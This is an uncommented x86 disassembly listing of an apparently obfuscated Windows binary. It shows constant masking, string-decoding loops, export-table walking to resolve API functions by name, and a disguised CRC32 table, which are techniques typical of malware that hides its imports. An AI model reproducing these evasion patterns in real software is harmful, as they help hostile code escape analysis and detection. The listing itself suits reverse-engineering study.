  426789:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  426790:	push   esi
  426791:	mov    esi,eax
  426793:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  42679a:	mov    edx,DWORD PTR [ebp-0x4]
  42679d:	mov    eax,0x75108a4
  4267a2:	xor    edx,eax
  4267a4:	mov    ecx,0x3272ec
  4267a9:	add    edx,ecx
  4267ab:	cmp    esi,edx
  4267ad:	je     0x4267ef
  4267af:	push   ebx
  4267b0:	push   edi
  4267b1:	mov    edx,DWORD PTR [ebp-0x8]
  4267b4:	mov    ebx,DWORD PTR [ebp+0x8]
  4267b7:	xor    edx,eax
  4267b9:	mov    edi,0xffcd8d14
  4267be:	sub    edi,edx
  4267c0:	add    esi,edi
  4267c2:	lea    edx,[esi-0x3272ec]
  4267c8:	xor    edx,eax
  4267ca:	mov    DWORD PTR [ebp-0xc],edx
  4267cd:	mov    edx,DWORD PTR [ebp-0x4]
  4267d0:	mov    edi,DWORD PTR [ebp-0xc]
  4267d3:	xor    dl,0xa4
  4267d6:	sub    dl,0x14
  4267d9:	xor    edi,eax
  4267db:	mov    BYTE PTR [edi+ebx*1+0x3272ec],dl
  4267e2:	mov    edx,DWORD PTR [ebp-0x4]
  4267e5:	xor    edx,eax
  4267e7:	add    edx,ecx
  4267e9:	cmp    esi,edx
  4267eb:	jne    0x4267b1
  4267ed:	pop    edi
  4267ee:	pop    ebx
  4267ef:	pop    esi
  4267f0:	leave  
  4267f1:	ret    0x4
  4267f4:	push   ebp
  4267f5:	mov    ebp,esp
  4267f7:	sub    esp,0x21c
  4267fd:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  426804:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  42680b:	mov    eax,DWORD PTR [ebp+0x10]
  42680e:	mov    eax,DWORD PTR [ebp-0x4]
  426811:	mov    ecx,DWORD PTR [ebp+0x8]
  426814:	push   esi
  426815:	push   edi
  426816:	mov    edi,0x75108a4
  42681b:	xor    eax,edi
  42681d:	mov    esi,0x3272ec
  426822:	add    eax,esi
  426824:	cmp    eax,ecx
  426826:	mov    eax,DWORD PTR [ebp-0x4]
  426829:	jne    0x426834
  42682b:	xor    eax,edi
  42682d:	add    eax,esi
  42682f:	jmp    0x4268e0
  426834:	mov    ecx,DWORD PTR [ebp+0xc]
  426837:	xor    eax,edi
  426839:	add    eax,esi
  42683b:	cmp    eax,ecx
  42683d:	jne    0x426844
  42683f:	mov    eax,DWORD PTR [ebp-0x4]
  426842:	jmp    0x42682b
  426844:	lea    eax,[ebp-0x21c]
  42684a:	mov    DWORD PTR [ebp-0x8],eax
  42684d:	mov    eax,DWORD PTR [ebp+0xc]
  426850:	mov    DWORD PTR [ebp-0x10],eax
  426853:	mov    eax,DWORD PTR [ebp-0x4]
  426856:	xor    eax,edi
  426858:	add    eax,esi
  42685a:	mov    DWORD PTR [ebp+0x10],eax
  42685d:	mov    eax,DWORD PTR [ebp+0xc]
  426860:	push   ebx
  426861:	call   0x42658b
  426866:	mov    ebx,eax
  426868:	mov    eax,DWORD PTR [ebp+0x8]
  42686b:	mov    eax,DWORD PTR [eax+0x14]
  42686e:	jmp    0x4268c8
  426870:	mov    eax,DWORD PTR [ebp+0xc]
  426873:	sub    eax,0x8
  426876:	mov    DWORD PTR [ebp-0xc],eax
  426879:	mov    eax,DWORD PTR [ebp-0xc]
  42687c:	mov    eax,DWORD PTR [eax+0x28]
  42687f:	call   0x426473
  426884:	mov    DWORD PTR [ebp+0x10],eax
  426887:	push   DWORD PTR [ebp+0x10]
  42688a:	mov    edx,DWORD PTR [ebp-0x8]
  42688d:	call   0x42661a
  426892:	mov    eax,DWORD PTR [ebp-0x4]
  426895:	xor    eax,edi
  426897:	add    eax,esi
  426899:	cmp    eax,ebx
  42689b:	jne    0x4268a5
  42689d:	mov    eax,DWORD PTR [ebp-0x8]
  4268a0:	call   0x426501
  4268a5:	mov    eax,DWORD PTR [ebp-0x14]
  4268a8:	xor    eax,edi
  4268aa:	add    eax,esi
  4268ac:	push   eax
  4268ad:	push   DWORD PTR [ebp-0x10]
  4268b0:	mov    eax,DWORD PTR [ebp-0x8]
  4268b3:	call   0x42622d
  4268b8:	mov    ecx,DWORD PTR [ebp-0x4]
  4268bb:	xor    ecx,edi
  4268bd:	add    ecx,esi
  4268bf:	cmp    eax,ecx
  4268c1:	je     0x4268e6
  4268c3:	mov    eax,DWORD PTR [ebp+0xc]
  4268c6:	mov    eax,DWORD PTR [eax]
  4268c8:	mov    DWORD PTR [ebp+0xc],eax
  4268cb:	mov    eax,DWORD PTR [ebp+0x8]
  4268ce:	mov    ecx,DWORD PTR [ebp+0xc]
  4268d1:	add    eax,0x14
  4268d4:	cmp    ecx,eax
  4268d6:	jne    0x426870
  4268d8:	mov    eax,DWORD PTR [ebp-0x4]
  4268db:	xor    eax,edi
  4268dd:	add    eax,esi
  4268df:	pop    ebx
  4268e0:	pop    edi
  4268e1:	pop    esi
  4268e2:	leave  
  4268e3:	ret    0xc
  4268e6:	mov    eax,DWORD PTR [ebp-0xc]
  4268e9:	mov    eax,DWORD PTR [eax+0x18]
  4268ec:	jmp    0x4268df
  4268ee:	push   ebp
  4268ef:	mov    ebp,esp
  4268f1:	mov    eax,DWORD PTR [ebp+0xc]
  4268f4:	sub    esp,0x10
  4268f7:	cmp    DWORD PTR [ebp+0x8],0x0
  4268fb:	push   ebx
  4268fc:	push   esi
  4268fd:	push   edi
  4268fe:	je     0x4269b3
  426904:	test   eax,eax
  426906:	je     0x4269b3
  42690c:	movzx  eax,WORD PTR [eax+0x20]
  426910:	mov    ecx,eax
  426912:	mov    DWORD PTR [ebp-0x10],eax
  426915:	xor    edx,edx
  426917:	and    DWORD PTR [ebp-0x8],edx
  42691a:	mov    eax,0x8a94
  42691f:	xor    ecx,eax
  426921:	add    ecx,0x3b56
  426927:	mov    DWORD PTR [ebp-0xc],ecx
  42692a:	and    DWORD PTR [ebp-0x4],0x0
  42692e:	xor    ecx,ecx
  426930:	push   0x7c
  426932:	pop    edi
  426933:	cmp    cx,WORD PTR [ebp-0xc]
  426937:	jae    0x42699d
  426939:	lea    esi,[edx-0x3b56]
  42693f:	xor    esi,eax
  426941:	movzx  ecx,WORD PTR [ebp-0x4]
  426945:	mov    ebx,DWORD PTR [ebp+0xc]
  426948:	lea    ecx,[ebx+ecx*4]
  42694b:	cmp    WORD PTR [ecx+0x2],si
  42694f:	jne    0x426988
  426951:	movzx  ecx,WORD PTR [ecx]
  426954:	mov    edi,0x4e3e
  426959:	cmp    cx,di
  42695c:	jne    0x42696a
  42695e:	mov    ebx,DWORD PTR [ebp+0x8]
  426961:	movzx  edi,dx
  426964:	cmp    BYTE PTR [edi+ebx*1],0x0
  426968:	je     0x426997
  42696a:	mov    ebx,DWORD PTR [ebp+0x8]
  42696d:	movzx  edi,dx
  426970:	movsx  di,BYTE PTR [edi+ebx*1]
  426975:	mov    ebx,0x3b56
  42697a:	sub    di,bx
  42697d:	xor    di,ax
  426980:	cmp    cx,di
  426983:	je     0x426997
  426985:	push   0x7a
  426987:	pop    edi
  426988:	inc    DWORD PTR [ebp-0x4]
  42698b:	mov    cx,WORD PTR [ebp-0xc]
  42698f:	cmp    WORD PTR [ebp-0x4],cx
  426993:	jb     0x426941
  426995:	jmp    0x42699d
  426997:	inc    DWORD PTR [ebp-0x8]
  42699a:	push   0x7d
  42699c:	pop    edi
  42699d:	mov    esi,DWORD PTR [ebp+0x8]
  4269a0:	movzx  ecx,dx
  4269a3:	cmp    BYTE PTR [ecx+esi*1],0x0
  4269a7:	je     0x4269bc
  4269a9:	inc    edx
  4269aa:	cmp    edi,0x7a
  4269ad:	jne    0x42692a
  4269b3:	xor    eax,eax
  4269b5:	pop    edi
  4269b6:	pop    esi
  4269b7:	pop    ebx
  4269b8:	leave  
  4269b9:	ret    0x8
  4269bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4269bf:	add    ecx,0xffffc4aa
  4269c5:	xor    cx,ax
  4269c8:	xor    eax,eax
  4269ca:	cmp    cx,WORD PTR [ebp-0x10]
  4269ce:	sete   al
  4269d1:	jmp    0x4269b5
  4269d3:	push   ebp
  4269d4:	mov    ebp,esp
  4269d6:	sub    esp,0x50
  4269d9:	push   edi
  4269da:	mov    edi,eax
  4269dc:	mov    eax,DWORD PTR [edi+0x1a8]
  4269e2:	cmp    DWORD PTR [eax],0x0
  4269e5:	jne    0x4269ee
  4269e7:	xor    eax,eax
  4269e9:	jmp    0x426b1f
  4269ee:	push   DWORD PTR [ebp+0x8]
  4269f1:	push   0x2c
  4269f3:	pop    eax
  4269f4:	call   0x426783
  4269f9:	mov    edx,DWORD PTR [edi+0x1ac]
  4269ff:	lea    eax,[edi+0x22]
  426a02:	mov    DWORD PTR [ebp-0x4c],eax
  426a05:	lea    eax,[edi+0x44]
  426a08:	mov    DWORD PTR [ebp-0x48],eax
  426a0b:	lea    eax,[edi+0x66]
  426a0e:	mov    DWORD PTR [ebp-0x44],eax
  426a11:	lea    eax,[edi+0x88]
  426a17:	mov    DWORD PTR [ebp-0x40],eax
  426a1a:	lea    eax,[edi+0xaa]
  426a20:	mov    DWORD PTR [ebp-0x3c],eax
  426a23:	lea    eax,[edi+0xcc]
  426a29:	mov    DWORD PTR [ebp-0x38],eax
  426a2c:	lea    eax,[edi+0xee]
  426a32:	mov    DWORD PTR [ebp-0x34],eax
  426a35:	lea    eax,[edi+0x110]
  426a3b:	mov    DWORD PTR [ebp-0x30],eax
  426a3e:	lea    eax,[edi+0x132]
  426a44:	mov    DWORD PTR [ebp-0x2c],eax
  426a47:	lea    eax,[edi+0x154]
  426a4d:	push   edi
  426a4e:	mov    DWORD PTR [ebp-0x50],edi
  426a51:	mov    DWORD PTR [ebp-0x28],eax
  426a54:	call   0x426b53
  426a59:	push   eax
  426a5a:	mov    eax,DWORD PTR [edi+0x1a8]
  426a60:	push   DWORD PTR [eax]
  426a62:	call   0x4267f4
  426a67:	mov    DWORD PTR [ebp-0x10],eax
  426a6a:	test   eax,eax
  426a6c:	je     0x426b1f
  426a72:	mov    ecx,DWORD PTR [eax+0x3c]
  426a75:	push   ebx
  426a76:	push   esi
  426a77:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426a7b:	add    esi,eax
  426a7d:	mov    edi,DWORD PTR [esi+0x24]
  426a80:	mov    ecx,DWORD PTR [esi+0x1c]
  426a83:	mov    edx,DWORD PTR [esi+0x20]
  426a86:	mov    ebx,DWORD PTR [esi+0x18]
  426a89:	add    edi,eax
  426a8b:	mov    DWORD PTR [ebp-0x20],edi
  426a8e:	mov    edi,DWORD PTR [esi+0x14]
  426a91:	add    ecx,eax
  426a93:	add    edx,eax
  426a95:	mov    DWORD PTR [ebp-0xc],ecx
  426a98:	mov    DWORD PTR [ebp-0x1c],edx
  426a9b:	mov    DWORD PTR [ebp-0x8],edi
  426a9e:	cmp    edi,ebx
  426aa0:	ja     0x426aa5
  426aa2:	mov    DWORD PTR [ebp-0x8],ebx
  426aa5:	xor    ebx,ebx
  426aa7:	mov    DWORD PTR [ebp-0x18],ebx
  426aaa:	cmp    DWORD PTR [ebp-0x8],ebx
  426aad:	jbe    0x426b1d
  426aaf:	jmp    0x426ab4
  426ab1:	mov    edx,DWORD PTR [ebp-0x1c]
  426ab4:	mov    edi,DWORD PTR [ebp-0x20]
  426ab7:	movzx  edi,WORD PTR [edi+ebx*2]
  426abb:	cmp    ebx,DWORD PTR [esi+0x18]
  426abe:	jae    0x426b1d
  426ac0:	cmp    edi,DWORD PTR [esi+0x14]
  426ac3:	jae    0x426b1d
  426ac5:	mov    ebx,DWORD PTR [edx+ebx*4]
  426ac8:	mov    edx,DWORD PTR [ebp+0x8]
  426acb:	mov    edi,DWORD PTR [ecx+edi*4]
  426ace:	mov    DWORD PTR [ebp-0x4],edx
  426ad1:	lea    edx,[ebp-0x50]
  426ad4:	add    ebx,eax
  426ad6:	add    edi,eax
  426ad8:	sub    edx,DWORD PTR [ebp+0x8]
  426adb:	mov    DWORD PTR [ebp-0x14],0xb
  426ae2:	mov    DWORD PTR [ebp-0x24],edx
  426ae5:	mov    edx,DWORD PTR [ebp-0x4]
  426ae8:	cmp    DWORD PTR [edx],0x0
  426aeb:	jne    0x426b08
  426aed:	mov    eax,DWORD PTR [ebp-0x24]
  426af0:	push   DWORD PTR [eax+edx*1]
  426af3:	push   ebx
  426af4:	call   0x4268ee
  426af9:	mov    ecx,DWORD PTR [ebp-0xc]
  426afc:	test   eax,eax
  426afe:	je     0x426b05
  426b00:	mov    eax,DWORD PTR [ebp-0x4]
  426b03:	mov    DWORD PTR [eax],edi
  426b05:	mov    eax,DWORD PTR [ebp-0x10]
  426b08:	add    DWORD PTR [ebp-0x4],0x4
  426b0c:	dec    DWORD PTR [ebp-0x14]
  426b0f:	jne    0x426ae5
  426b11:	mov    ebx,DWORD PTR [ebp-0x18]
  426b14:	inc    ebx
  426b15:	mov    DWORD PTR [ebp-0x18],ebx
  426b18:	cmp    ebx,DWORD PTR [ebp-0x8]
  426b1b:	jb     0x426ab1
  426b1d:	pop    esi
  426b1e:	pop    ebx
  426b1f:	pop    edi
  426b20:	leave  
  426b21:	ret    0x4
  426b24:	push   ebp
  426b25:	mov    ebp,esp
  426b27:	mov    eax,DWORD PTR [ebp+0x8]
  426b2a:	push   esi
  426b2b:	push   DWORD PTR [eax+0x1d8]
  426b31:	lea    esi,[eax+0x198]
  426b37:	mov    eax,DWORD PTR [ebp+0x8]
  426b3a:	call   0x4269d3
  426b3f:	mov    ecx,DWORD PTR [esi]
  426b41:	mov    DWORD PTR [ecx],eax
  426b43:	mov    eax,DWORD PTR [esi]
  426b45:	xor    ecx,ecx
  426b47:	cmp    DWORD PTR [eax],ecx
  426b49:	pop    esi
  426b4a:	setne  cl
  426b4d:	mov    eax,ecx
  426b4f:	pop    ebp
  426b50:	ret    0x4
  426b53:	mov    ecx,DWORD PTR [edi+0x188]
  426b59:	push   ebx
  426b5a:	jmp    0x426b6f
  426b5c:	xor    eax,0x8a94
  426b61:	add    eax,0x3b56
  426b66:	mov    WORD PTR [ecx],ax
  426b69:	add    ecx,0x2
  426b6c:	add    edx,0x2
  426b6f:	movzx  eax,WORD PTR [edx]
  426b72:	mov    ebx,0x4e3e
  426b77:	cmp    ax,bx
  426b7a:	jne    0x426b5c
  426b7c:	xor    eax,eax
  426b7e:	mov    WORD PTR [ecx],ax
  426b81:	mov    eax,DWORD PTR [edi+0x188]
  426b87:	pop    ebx
  426b88:	ret    
  426b89:	push   edi
  426b8a:	mov    edi,eax
  426b8c:	mov    eax,DWORD PTR [esi+0x188]
  426b92:	shl    edi,0x6
  426b95:	add    eax,edi
  426b97:	jmp    0x426ba3
  426b99:	xor    cl,0x79
  426b9c:	sub    cl,0x3
  426b9f:	mov    BYTE PTR [eax],cl
  426ba1:	inc    eax
  426ba2:	inc    edx
  426ba3:	mov    cl,BYTE PTR [edx]
  426ba5:	cmp    cl,0x7a
  426ba8:	jne    0x426b99
  426baa:	mov    BYTE PTR [eax],0x0
  426bad:	mov    eax,DWORD PTR [esi+0x188]
  426bb3:	add    eax,edi
  426bb5:	pop    edi
  426bb6:	ret    
  426bb7:	push   ebp
  426bb8:	mov    ebp,esp
  426bba:	sub    esp,0x14
  426bbd:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  426bc4:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  426bcb:	mov    eax,DWORD PTR [ebx]
  426bcd:	mov    DWORD PTR [ebp-0x8],eax
  426bd0:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  426bd7:	push   esi
  426bd8:	push   edi
  426bd9:	mov    DWORD PTR [ebp-0x14],0xead71890
  426be0:	mov    edi,DWORD PTR [ebp-0x4]
  426be3:	mov    ecx,DWORD PTR [ebp-0x10]
  426be6:	mov    eax,0x75108a4
  426beb:	xor    edi,eax
  426bed:	mov    edx,0x3272ec
  426bf2:	xor    ecx,eax
  426bf4:	add    edi,edx
  426bf6:	add    ecx,edx
  426bf8:	imul   edi,ecx
  426bfb:	jmp    0x426c43
  426bfd:	mov    ecx,DWORD PTR [ebp-0x8]
  426c00:	mov    esi,DWORD PTR [ebp-0x4]
  426c03:	xor    ecx,eax
  426c05:	xor    esi,eax
  426c07:	add    ecx,edx
  426c09:	add    esi,edx
  426c0b:	test   esi,ecx
  426c0d:	mov    esi,DWORD PTR [ebp-0x8]
  426c10:	mov    ecx,DWORD PTR [ebp-0x4]
  426c13:	je     0x426c2a
  426c15:	xor    ecx,eax
  426c17:	xor    esi,eax
  426c19:	add    ecx,edx
  426c1b:	add    esi,edx
  426c1d:	shr    esi,cl
  426c1f:	mov    ecx,DWORD PTR [ebp-0x14]
  426c22:	xor    ecx,eax
  426c24:	add    ecx,edx
  426c26:	xor    esi,ecx
  426c28:	jmp    0x426c34
  426c2a:	xor    esi,eax
  426c2c:	xor    ecx,eax
  426c2e:	add    esi,edx
  426c30:	add    ecx,edx
  426c32:	shr    esi,cl
  426c34:	mov    DWORD PTR [ebp-0x8],esi
  426c37:	mov    ecx,DWORD PTR [ebp-0x4]
  426c3a:	xor    ecx,eax
  426c3c:	lea    edi,[edi+ecx*1+0x3272ec]
  426c43:	mov    ecx,DWORD PTR [ebp-0xc]
  426c46:	mov    esi,DWORD PTR [ebp-0x4]
  426c49:	xor    esi,eax
  426c4b:	xor    ecx,eax
  426c4d:	sub    ecx,esi
  426c4f:	cmp    edi,ecx
  426c51:	jbe    0x426bfd
  426c53:	mov    eax,DWORD PTR [ebp-0x8]
  426c56:	pop    edi
  426c57:	mov    DWORD PTR [ebx],eax
  426c59:	mov    eax,DWORD PTR [ebp-0x8]
  426c5c:	pop    esi
  426c5d:	leave  
  426c5e:	ret    
  426c5f:	push   ebp
  426c60:	mov    ebp,esp
  426c62:	sub    esp,0x38
  426c65:	push   ebx
  426c66:	mov    ebx,0xf89c85b0
  426c6b:	mov    DWORD PTR [ebp-0x4],ebx
  426c6e:	lea    eax,[ebx+0x1]
  426c71:	push   esi
  426c72:	mov    DWORD PTR [ebp-0x24],eax
  426c75:	mov    ecx,DWORD PTR [ebp-0x4]
  426c78:	mov    edx,DWORD PTR [ebp+0x8]
  426c7b:	mov    esi,0x75108a4
  426c80:	push   edi
  426c81:	xor    ecx,esi
  426c83:	mov    edi,0x3272ec
  426c88:	add    ecx,edi
  426c8a:	cmp    edx,ecx
  426c8c:	je     0x426df2
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	mov    edx,DWORD PTR [ebp+0xc]
  426c98:	xor    ecx,esi
  426c9a:	add    ecx,edi
  426c9c:	cmp    edx,ecx
  426c9e:	je     0x426df2
  426ca4:	mov    ecx,DWORD PTR [ebp+0x10]
  426ca7:	mov    DWORD PTR [ebp-0x14],ecx
  426caa:	mov    ecx,DWORD PTR [ebp+0xc]
  426cad:	mov    edx,DWORD PTR [ebp+0x8]
  426cb0:	mov    DWORD PTR [ebp-0x18],0xf89c8533
  426cb7:	mov    DWORD PTR [ebp-0x1c],eax
  426cba:	mov    DWORD PTR [ebp-0x10],ebx
  426cbd:	mov    DWORD PTR [ebp+0xc],eax
  426cc0:	mov    DWORD PTR [ebp+0x10],0xf89c85b2
  426cc7:	mov    eax,DWORD PTR [ebp+0xc]
  426cca:	xor    eax,esi
  426ccc:	mov    DWORD PTR [ebp-0x20],ecx
  426ccf:	sub    ecx,eax
  426cd1:	sub    ecx,edi
  426cd3:	mov    DWORD PTR [ebp+0x8],ecx
  426cd6:	mov    DWORD PTR [ebp-0xc],edx
  426cd9:	mov    DWORD PTR [ebp-0x8],0xf89c85bd
  426ce0:	jmp    0x426de2
  426ce5:	mov    eax,DWORD PTR [ebp+0xc]
  426ce8:	mov    ecx,DWORD PTR [ebp+0xc]
  426ceb:	xor    eax,esi
  426ced:	xor    ecx,esi
  426cef:	lea    ecx,[eax+ecx*1+0x64e5d8]
  426cf6:	mov    eax,DWORD PTR [ebp+0x8]
  426cf9:	xor    edx,edx
  426cfb:	div    ecx
  426cfd:	mov    eax,DWORD PTR [ebp+0x10]
  426d00:	mov    ecx,DWORD PTR [ebp+0xc]
  426d03:	xor    eax,esi
  426d05:	xor    ecx,esi
  426d07:	sub    eax,ecx
  426d09:	cmp    edx,eax
  426d0b:	jne    0x426da1
  426d11:	mov    eax,DWORD PTR [ebp+0x8]
  426d14:	mov    ecx,DWORD PTR [ebp-0xc]
  426d17:	mov    dl,BYTE PTR [eax+ecx*1]
  426d1a:	mov    eax,DWORD PTR [ebp-0x10]
  426d1d:	mov    ecx,DWORD PTR [ebp-0x8]
  426d20:	xor    eax,esi
  426d22:	xor    ecx,esi
  426d24:	add    eax,edi
  426d26:	add    ecx,edi
  426d28:	cmp    eax,ecx
  426d2a:	jae    0x426d72
  426d2c:	lea    ecx,[eax-0x3272ec]
  426d32:	mov    DWORD PTR [ebp-0x4],ecx
  426d35:	mov    ebx,DWORD PTR [ebp-0x4]
  426d38:	xor    ebx,esi
  426d3a:	add    ebx,0x7f55d8f2
  426d40:	lea    ecx,[ebp+eax*4-0x38]
  426d44:	mov    DWORD PTR [ecx],ebx
  426d46:	mov    ebx,DWORD PTR [ecx]
  426d48:	cmp    ebx,0x244ecb93
  426d4e:	jbe    0x426d58
  426d50:	add    DWORD PTR [ecx],0x405fcdc
  426d56:	jmp    0x426d5e
  426d58:	add    DWORD PTR [ecx],0xfdaf4324
  426d5e:	mov    ecx,DWORD PTR [ebp-0x8]
  426d61:	xor    ecx,esi
  426d63:	inc    eax
  426d64:	inc    DWORD PTR [ebp-0x4]
  426d67:	add    ecx,edi
  426d69:	cmp    eax,ecx
  426d6b:	jb     0x426d35
  426d6d:	mov    ebx,0xf89c85b0
  426d72:	cmp    DWORD PTR [ebp-0x14],0x0
  426d76:	jne    0x426d80
  426d78:	xor    dl,0x79
  426d7b:	sub    dl,0x3
  426d7e:	jmp    0x426d96
  426d80:	mov    eax,DWORD PTR [ebp-0x18]
  426d83:	xor    al,0xa4
  426d85:	mov    cl,0x14
  426d87:	sub    cl,al
  426d89:	add    dl,cl
  426d8b:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d8e:	xor    cl,0xa4
  426d91:	sub    cl,0x14
  426d94:	ror    dl,cl
  426d96:	xor    eax,eax
  426d98:	mov    eax,DWORD PTR [ebp+0x8]
  426d9b:	mov    ecx,DWORD PTR [ebp-0xc]
  426d9e:	mov    BYTE PTR [eax+ecx*1],dl
  426da1:	mov    eax,DWORD PTR [ebp+0x8]
  426da4:	mov    ecx,DWORD PTR [ebp-0x10]
  426da7:	sub    eax,edi
  426da9:	xor    eax,esi
  426dab:	cmp    eax,ecx
  426dad:	jne    0x426dd0
  426daf:	mov    eax,DWORD PTR [ebp+0x10]
  426db2:	mov    ecx,DWORD PTR [ebp+0xc]
  426db5:	xor    eax,esi
  426db7:	xor    ecx,esi
  426db9:	sub    eax,ecx
  426dbb:	mov    ecx,DWORD PTR [ebp-0x20]
  426dbe:	sub    eax,edi
  426dc0:	xor    eax,esi
  426dc2:	mov    DWORD PTR [ebp+0x10],eax
  426dc5:	mov    eax,DWORD PTR [ebp+0xc]
  426dc8:	xor    eax,esi
  426dca:	sub    ecx,eax
  426dcc:	sub    ecx,edi
  426dce:	jmp    0x426ddf
  426dd0:	mov    eax,DWORD PTR [ebp+0xc]
  426dd3:	xor    eax,esi
  426dd5:	mov    ecx,0xffcd8d14
  426dda:	sub    ecx,eax
  426ddc:	add    ecx,DWORD PTR [ebp+0x8]
  426ddf:	mov    DWORD PTR [ebp+0x8],ecx
  426de2:	mov    eax,DWORD PTR [ebp+0x10]
  426de5:	cmp    eax,ebx
  426de7:	jne    0x426ce5
  426ded:	mov    eax,DWORD PTR [ebp-0x24]
  426df0:	jmp    0x426df5
  426df2:	mov    eax,DWORD PTR [ebp-0x4]
  426df5:	xor    eax,esi
  426df7:	add    eax,edi
  426df9:	pop    edi
  426dfa:	pop    esi
  426dfb:	pop    ebx
  426dfc:	leave  
  426dfd:	ret    0xc
  426e00:	push   ebp
  426e01:	mov    ebp,esp
  426e03:	sub    esp,0x420
  426e09:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  426e10:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  426e17:	mov    DWORD PTR [ebp-0x18],0xf89c86b0
  426e1e:	push   ebx
  426e1f:	mov    DWORD PTR [ebp-0x1c],0xf89c85b7
  426e26:	mov    eax,DWORD PTR [ebp-0x14]
  426e29:	push   esi
  426e2a:	mov    esi,0x75108a4
  426e2f:	push   edi
  426e30:	xor    eax,esi
  426e32:	mov    edi,0x3272ec
  426e37:	add    eax,edi
  426e39:	mov    DWORD PTR [ebp-0x8],eax
  426e3c:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  426e43:	mov    DWORD PTR [ebp-0x4],0xead71890
  426e4a:	mov    DWORD PTR [ebp-0x10],0x8
  426e51:	mov    ecx,ecx
  426e53:	mov    eax,DWORD PTR [ebp-0xc]
  426e56:	mov    ecx,DWORD PTR [ebp-0x14]
  426e59:	xor    eax,esi
  426e5b:	xor    ecx,esi
  426e5d:	add    eax,edi
  426e5f:	add    ecx,edi
  426e61:	imul   eax,ecx
  426e64:	jmp    0x426e97
  426e66:	mov    eax,DWORD PTR [ebp-0x4]
  426e69:	sub    eax,edi
  426e6b:	xor    eax,esi
  426e6d:	mov    DWORD PTR [ebp-0x8],eax
  426e70:	lea    ebx,[ebp-0x8]
  426e73:	call   0x426bb7
  426e78:	mov    DWORD PTR [ebp-0x8],eax
  426e7b:	mov    eax,DWORD PTR [ebp-0x8]
  426e7e:	mov    ecx,DWORD PTR [ebp-0x4]
  426e81:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  426e88:	mov    eax,DWORD PTR [ebp-0xc]
  426e8b:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8e:	xor    eax,esi
  426e90:	lea    eax,[eax+ecx*1+0x3272ec]
  426e97:	mov    DWORD PTR [ebp-0x4],eax
  426e9a:	mov    eax,DWORD PTR [ebp-0x18]
  426e9d:	mov    ecx,DWORD PTR [ebp-0xc]
  426ea0:	xor    ecx,esi
  426ea2:	xor    eax,esi
  426ea4:	sub    eax,ecx
  426ea6:	mov    ecx,DWORD PTR [ebp-0x4]
  426ea9:	cmp    ecx,eax
  426eab:	jbe    0x426e66
  426ead:	mov    eax,DWORD PTR [ebp-0x1c]
  426eb0:	xor    eax,esi
  426eb2:	add    eax,edi
  426eb4:	mov    DWORD PTR [ebp-0x8],eax
  426eb7:	mov    DWORD PTR [ebp-0x18],0xf89c86b7
  426ebe:	mov    ebx,ebx
  426ec0:	jmp    0x426f23
  426ec2:	mov    ecx,DWORD PTR [ebp-0x20]
  426ec5:	mov    eax,DWORD PTR [ebp-0x8]
  426ec8:	xor    ecx,esi
  426eca:	add    ecx,edi
  426ecc:	shr    eax,cl
  426ece:	mov    DWORD PTR [ebp-0x4],eax
  426ed1:	mov    eax,DWORD PTR [ebp+0x8]
  426ed4:	mov    cl,BYTE PTR [eax]
  426ed6:	mov    BYTE PTR [ebp+0xb],cl
  426ed9:	mov    cl,BYTE PTR [ebp+0xb]
  426edc:	mov    edx,DWORD PTR [ebp-0x8]
  426edf:	movzx  ecx,cl
  426ee2:	xor    ecx,edx
  426ee4:	mov    DWORD PTR [ebp+0x8],ecx
  426ee7:	mov    ecx,DWORD PTR [ebp-0x18]
  426eea:	mov    edx,DWORD PTR [ebp+0x8]
  426eed:	xor    ecx,esi
  426eef:	add    ecx,edi
  426ef1:	and    ecx,edx
  426ef3:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  426efa:	mov    edx,DWORD PTR [ebp-0x4]
  426efd:	xor    ecx,edx
  426eff:	mov    DWORD PTR [ebp-0x8],ecx
  426f02:	mov    ecx,DWORD PTR [ebp-0xc]
  426f05:	xor    ecx,esi
  426f07:	lea    eax,[eax+ecx*1+0x3272ec]
  426f0e:	mov    DWORD PTR [ebp+0x8],eax
  426f11:	mov    eax,DWORD PTR [ebp-0xc]
  426f14:	xor    eax,esi
  426f16:	mov    ecx,0xffcd8d14
  426f1b:	sub    ecx,eax
  426f1d:	add    ecx,DWORD PTR [ebp-0x10]
  426f20:	mov    DWORD PTR [ebp-0x10],ecx
  426f23:	mov    eax,DWORD PTR [ebp-0x14]
  426f26:	mov    ecx,DWORD PTR [ebp-0x10]
  426f29:	xor    eax,esi
  426f2b:	add    eax,edi
  426f2d:	cmp    ecx,eax
  426f2f:	jne    0x426ec2
  426f31:	mov    eax,DWORD PTR [ebp-0x1c]
  426f34:	mov    ecx,DWORD PTR [ebp-0x8]
  426f37:	xor    eax,esi
  426f39:	add    eax,edi
  426f3b:	pop    edi
  426f3c:	pop    esi
  426f3d:	xor    eax,ecx
  426f3f:	pop    ebx
  426f40:	leave  
  426f41:	ret    0x4
  426f44:	push   ebp
  426f45:	mov    ebp,esp
  426f47:	mov    eax,DWORD PTR [ebp+0x1c]
  426f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  426f4d:	mov    edx,DWORD PTR [ebp+0x10]
  426f50:	mov    eax,DWORD PTR [eax+0x190]
  426f56:	mov    eax,DWORD PTR [eax]
  426f58:	sub    esp,0x64
  426f5b:	push   ebx
  426f5c:	push   esi
  426f5d:	push   edi
  426f5e:	mov    edi,0x75108a4
  426f63:	xor    ecx,edi
  426f65:	mov    ebx,0x3272ec
  426f6a:	add    ecx,ebx
  426f6c:	cmp    ecx,edx
  426f6e:	jne    0x426f7f
  426f70:	or     DWORD PTR ds:0x3750c3e,0x4263eb2f
  426f7a:	jmp    0x42747b
  426f7f:	mov    ecx,DWORD PTR [ebp+0x8]
  426f82:	mov    esi,DWORD PTR [ebp+0x14]
